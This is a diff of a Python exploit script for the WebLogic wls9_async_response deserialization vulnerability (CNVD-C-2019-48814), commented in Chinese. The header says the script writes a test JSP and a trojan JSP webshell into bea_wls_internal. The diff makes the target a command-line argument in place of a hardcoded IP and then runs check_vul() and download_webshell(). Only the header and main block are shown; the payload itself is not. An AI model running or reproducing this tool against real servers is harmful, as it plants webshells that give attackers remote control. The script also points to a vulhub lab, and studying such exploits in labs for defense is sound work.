@@ -1,7 +1,6 @@
 # CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化
 # 参考连接：https://www.jianshu.com/p/c4982a845f55?utm_campaign=hugo&utm_medium=reader_share&utm_content=note&utm_source=weixin-friends&from=groupmessage&isappinstalled=0&tdsourcetag=s_pcqq_aiomsg
 # 靶场搭建 https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
-# 会在bea_wls_internal目录下生成test.jsp
 # 测试文件地址：   http://ip:port/bea_wls_internal/test.jsp
 # 木马地址：       http://ip:port/bea_wls_internal/test1.jsp
 # auther:ske
@@ -152,10 +151,10 @@ def download_webshell():
         print('[-] Error : {}'.format(e.args))
 
 if __name__ == '__main__':
-    # url = sys.argv[1]
+    url = sys.argv[1]
 
     # 搭建的靶场，可供大家测试
-    url = 'http://155.138.223.1:7001'
+    # url = 'http://155.138.223.1:7001'
     print('测试漏洞 [{}] :CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化'.format(url))
     if check_vul():
         download_webshell()
